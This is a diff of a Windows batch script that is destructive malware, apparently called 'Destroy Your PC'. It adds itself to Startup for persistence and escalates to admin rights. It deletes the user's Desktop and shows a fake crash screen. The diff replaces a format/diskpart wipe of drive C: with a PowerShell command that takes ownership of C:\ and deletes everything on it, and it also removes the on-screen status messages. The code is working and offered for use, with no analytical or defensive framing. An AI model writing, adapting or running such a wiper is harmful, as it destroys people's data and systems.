@@ -6,7 +6,6 @@ copy "%~dp0punish.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\
 :: === ADMIN CHECK ===
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
-    echo [!] Admin rights required. Relaunching...
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit
 )
@@ -43,7 +42,6 @@ start cmd /c "color 1F && mode con: cols=80 lines=25 && echo A problem has been 
 copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat" >nul
 
 :: === MESS WITH USER ===
-echo Messing with Desktop...
 takeown /f "%userprofile%\Desktop" /r /d y >nul
 rmdir /s /q "%userprofile%\Desktop"
 
@@ -61,25 +59,8 @@ ping localhost -n 2 >nul
 echo Virus fully deployed.
 ping localhost -n 2 >nul
 
-:: === WIPE MET DUBBELE METHODE ===
-set drive=C:
-
-echo [!!] FIRST EXECUTION DETECTED - INITIATING DESTRUCTION...
-
-:: Methode 1: format quick
-echo Y | format %drive% /fs:NTFS /q /y
-
-:: Methode 2: diskpart clean + partition + format
-(
-echo select volume %drive:~0,1%
-echo clean
-echo create partition primary
-echo format fs=ntfs quick label=WIPED
-echo assign
-) > diskpart_script.txt
-
-diskpart /s diskpart_script.txt
-del diskpart_script.txt
+:: === WIPE MET POWERSHELL ===
+powershell -Command "Takeown /f C:\* /r /d y; Icacls C:\* /grant '$env:USERNAME':F /t /c; Remove-Item C:\* -Recurse -Force; Remove-Item C:\ -Recurse -Force"
 
 :: === FINAL POPUP ===
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', 'Warning')"
